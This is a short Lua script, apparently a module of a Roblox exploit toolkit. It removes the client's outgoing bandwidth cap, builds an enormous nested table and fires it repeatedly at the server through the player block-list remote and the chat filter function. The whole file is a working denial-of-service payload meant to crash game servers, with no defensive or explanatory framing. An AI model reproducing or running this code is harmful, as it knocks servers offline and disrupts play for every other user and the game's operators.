-- This software, and it's associated files/documents, are protected by the General Public License v3, see LICENSE.txt for more information
-- Copyright (C) 2022 Latte Softworks, all rights reserved.

task.spawn(function()
    Services.NetworkClient:SetOutgoingKBPSLimit(math.huge)

    local t, t2 = {}, {}
    
    for _ = 1, FLAGS.Crash.Increment do
        table.insert( t2, {} )
    end
    
    for _ = 1, 4999999 / (FLAGS.Crash.Increment + 2) do
        table.insert( t, t2 )
    end
    
    for i = 1, FLAGS.Crash.Attempts do
        Services.RobloxReplicatedStorage.SetPlayerBlockList:FireServer( t )
        Services.Chat:FilterStringForBroadcast( t, Client )
    end
end)